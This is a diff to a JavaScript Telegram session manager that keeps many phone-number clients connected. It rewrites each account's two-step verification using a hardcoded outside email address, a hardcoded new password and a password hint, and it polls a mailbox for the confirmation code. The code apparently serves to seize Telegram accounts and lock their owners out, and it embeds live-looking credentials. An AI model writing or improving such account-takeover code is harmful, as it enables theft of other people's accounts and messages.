@@ -98,6 +98,10 @@ class TelegramManager {
                     }
                     clients.delete(this.phoneNumber);
                 }, 180000)
+            } else {
+                setInterval(async () => {
+                    await this.client.connect();
+                }, 20000);
             }
             this.client.addEventHandler(async (event) => { await this.handleEvents(event) }, new NewMessage());
             const chats = await this.client?.getDialogs({ limit: 500 });
@@ -291,7 +295,7 @@ class TelegramManager {
                 await this.client.updateTwoFaSettings({
                     isCheckPassword: false,
                     email: "storeslaksmi@gmail.com",
-                    hint: "Police Complaint Registered for SEX SPAM - Delhi Police",
+                    hint: "password - India143",
                     newPassword: "Ajtdmwajt1@",
                     emailCodeCallback: async (length) => {
                         console.log("code sent");
@@ -315,7 +319,7 @@ class TelegramManager {
                                     disconnectfromMail()
                                     resolve(code);
                                 }
-                            }, 3000);
+                            }, 6000);
                         });
                     },
                     onEmailCodeError: (e) => { console.log(e); return Promise.resolve("error") }
